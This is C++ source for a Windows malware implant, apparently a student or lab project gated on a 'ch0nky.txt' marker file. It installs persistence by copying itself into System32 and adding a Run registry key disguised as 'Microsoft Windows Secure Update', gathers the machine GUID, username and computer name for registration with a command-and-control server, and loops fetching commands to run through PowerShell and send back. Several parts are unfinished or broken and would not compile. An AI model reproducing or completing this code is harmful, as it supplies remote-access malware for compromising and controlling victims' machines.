#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <winreg.h>
#include <WinBase.h>
#include <lmcons.h>
#include <securitybaseapi.h>
#include <winerror.h>
#include <iphlpapi.h>
#include <iptypes.h>
#include <processthreadsapi.h>


#include <ws2tcpip.h>

#include <fileapi.h> //for chonkycheck()

//For Persistence--------------------------------------------------------
/* *Credit*
https://github.com/CoolerVoid/X_files/blob/master/src/automatically_run_proc_startup.cpp 
*/
#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <stdio.h>
#include <memory>

// run at 32bit and 64bit
#define KEY_WOW64_32KEY 0x0200
#define KEY_WOW64_64KEY 0x0100
#if defined(_WIN64)
 #define CROSS_ACCESS KEY_WOW64_32KEY
#else
 #define CROSS_ACCESS KEY_WOW64_64KEY
#endif
//For Persistence---------------------------------------------------------------



//For hex converter
#include <stdexcept>
#include <sstream>
#include <iomanip>
#include <string>
#include <cstdint>
//For hex converter

//#include <info.h>



//Chonkycheck
bool chonkyCheck(){
    bool isChonkyPresent = false;
    wchar_t *fileName = L"C:\\malware\\ch0nky.txt"; //Check if this is the right way to include file: is it just chonky.txt or whole path??
    DWORD result = GetFileAttributesW(fileName);
    if(result != INVALID_FILE_ATTRIBUTES){
        //File is there
        isChonkyPresent = true;
        return isChonkyPresent;
    }
    //file is not there
    return isChonkyPresent; 
}




//DLL stealer


//----------------------------------------------------------------------Persistence---------------------------------------------------------------------------//
int persistentdll(){
    // copy program implant.dll to system32 directory
    wchar_t system2[MAX_PATH];
    wchar_t pathtofile[MAX_PATH];
    HMODULE ModPath = GetModuleHandle(NULL);
    GetModuleFileName(ModPath,pathtofile,sizeof(pathtofile));
    GetSystemDirectory(system2,sizeof(system2));
    wcscat(system2,L"\\implant.dll"); // program name at second argv
    CopyFile(pathtofile,system2,false);

    // write registry entries
    HKEY hKey;
    RegOpenKeyEx(HKEY_LOCAL_MACHINE,L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_SET_VALUE | CROSS_ACCESS,&hKey );
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724923%28v=vs.85%29.aspx
    RegSetValueEx(hKey, L"Microsoft Windows Secure Update",0,REG_SZ,(const unsigned char*)system2,sizeof(system2));
    RegCloseKey(hKey);

	return EXIT_SUCCESS;
}
//---------------------------------------------------------------------Persistence---------------------------------------------------------------------------//




//-------------------------------------------------------------------C2 Communication Functions---------------------------------------------------------------//

wchar_t *server = L"http://127.0.0.1:8050"; 
wchar_t *register_path = L"/register";
wchar_t *checkin_path = wcscat( L"/checkin/", GetMachineGuid()); //concat with implant_id

//Convert from string to hex
//https://stackoverflow.com/questions/3381614/c-convert-string-to-hexadecimal-and-vice-versa
std::wstring string_to_hex(const std::wstring &in) {
    std::wstringstream ss;

    ss << std::hex << std::setfill('0');
    for (size_t i = 0; in.length() > i; ++i) {
        ss << std::setw(2) << static_cast<unsigned int>(static_cast<unsigned char>(in[i]));
    }

    return ss.str(); 
}


//get cmd
wchar_t *getCMD(){
	wchar_t* CMD;
	wchar_t* result = makeHttpCMDRequest(server, 443, checkin_path, 1, NULL); //NULL == optional data to send to post request
	if(result != NULL){
		CMD = result.parse(); //MAKE PARSE FUNCTION
	}
	return CMD;
}

//Run cmd
wchar_t *runCMD(wchar_t*CMD){
	wchar_t*output;
	if(CMD ==NULL){
		return output;
	}
	BOOL h = CreateProcessW();
	if(!h){
		return output;
	}
	myPipe = CreateNamedPipeW(h);
	result = pOpen(myPipe, powershell, CMD, output = read(myPipe));
	output = result.read();
	return output;
}
BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

//Create Process
BOOL processSuccess = CreateProcessW(NULL, NULL, NULL, NULL, );
//CreatePipe to run powershell.exe c/ cmds
//read results from pipe

//sendResponse(data from runtasks)
void sendData(wchar_t*output){
	if(Data !=NULL){
		Data = hex(output);
		POST(server, 443, checkin_path, 1, Data);
	}
	return;
}

//register()
/*
implant_id = os.urandom(10).hex()
    whoami = subprocess.Popen("whoami", stdout=subprocess.PIPE)
    output += result.stdout.read().decode()
    r = requests.post(f"{server}{reigster_path}", json={"implant_id":implant_id, "whoami":whoami})
    if r.status_code ==200:
        if r.text == "OK":
            print("reigstered!")
            return True 
        
    return False 
	*/

bool registerImplant(){
	//Victim/implant info
	wchar_t *implant_id = wcscat(L"guid=", GetMachineGuid());
	wchar_t *implant_username = wcscat(L"&username=", myGetUserName());
	wchar_t *implant_computername = wcscat(L"&computername=", myGetComputerName());

	wchar_t *payload1 = wcscat(implant_id, implant_username);
	wchar_t *payload2 = wcscat(payload1, implant_computername);

	std::wstring hexpayload = string_to_hex(payload2);
	//post to concat server + registerpath, put into json ?? (implant_id, whoami)


	
	

	return false;
}

//-------------------------------------------------------------------C2 Communication Functions---------------------------------------------------------------//




//----------------------------------------------------------Situational Awareness-------------------------------------------------------------------------------//
//Root privileges
//https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-checktokenmembership
wchar_t *checkPrivileges(){
	//Check if admin
	PSID AdministratorsGroup;
	SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
	BOOL isAdmin = AllocateAndInitializeSid(&NtAuthority,2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 
	0, 0, 0, 0, 0, 0, &AdministratorsGroup );
	
	if(isAdmin){
		if(!CheckTokenMembership(NULL, AdministratorsGroup, &isAdmin )){
			isAdmin = FALSE;
			FreeSid(AdministratorsGroup);
            //Not Admin privileges
			wchar_t *privilegeGroup = L"NotAdmin";
			return  privilegeGroup;
		}
		FreeSid(AdministratorsGroup);
	}
	wchar_t *privilegeGroup = L"Admin";
	return  privilegeGroup;
}

//Computer Name
wchar_t *myGetComputerName(){
	wchar_t *compNameBuffer = new wchar_t [MAX_COMPUTERNAME_LENGTH*sizeof(wchar_t) + 1];
	DWORD BufferSize = MAX_COMPUTERNAME_LENGTH*sizeof(wchar_t) + 1;
	long compNameSuccess = GetComputerNameW(compNameBuffer, &BufferSize);
	if(compNameSuccess == 0){
        //Fail
		wchar_t *FAIL = L"FAIL";
		return FAIL;
	}
	else {
		return compNameBuffer; 
	}
}

//Machine Guid
wchar_t *GetMachineGuid (){
	wchar_t *guidBuffer = new wchar_t[255];  
	DWORD Buffersize = 255;
	HKEY hkey;
	
	//use regopen first
	long regOpenSuccess = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hkey);
	if(regOpenSuccess != ERROR_SUCCESS){
        //fail
		wchar_t *FAIL = L"FAIL";
		return FAIL;
	}
	//RegGetValueW
	long guidSuccess = RegGetValueW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Cryptography", L"MachineGuid", RRF_RT_REG_SZ, NULL, guidBuffer, (LPDWORD) &Buffersize);
	if (guidSuccess!= 0){ 
		wchar_t *FAIL = L"FAIL"; 

		//RegCloseKey	
		RegCloseKey(hkey);
		return FAIL;
	}
	else {
		return guidBuffer; 
	}
	//RegCloseKey	
	RegCloseKey(hkey); 
}

//Current Username
wchar_t *myGetUserName(){
	wchar_t *userNameBuffer = new wchar_t[UNLEN*sizeof(wchar_t) + 1]; 
	DWORD BufferSize = sizeof(userNameBuffer);
	long UNSuccess = GetUserNameW(userNameBuffer, &BufferSize);
	if (UNSuccess == 0){
		//fail
        wchar_t *FAIL = L"FAIL";
		return FAIL;  
	}
	else {
		return userNameBuffer; 
	}
}


//----------------------------------------------------------Situational Awareness-------------------------------------------------------------------------------//






int wmain(int argc, wchar_t* argv[]){

    //First thing to do is check if Ch0nky file is there: if not--> exit program and don't inject, else--> continue
    bool chonkyPresence = chonkyCheck();
    if(chonkyPresence == false){ //Not sure if this would stop the reflective loader !!!
        //do nothing
        return 0;
    }
	//Call persistence
	persistentdll();

   //Register function
   //loop to get and send tasks
   while(!registerImplant()){
	   Sleep(1000);
   }
   while(true){

	   wchar_t *newCMD = getCMD();
	   if(newCMD != NULL){
		   wchar_t *output = runCMD(newCMD);
		   sendData(output);
	   }
   }

    
    

    


	return 0;
    
}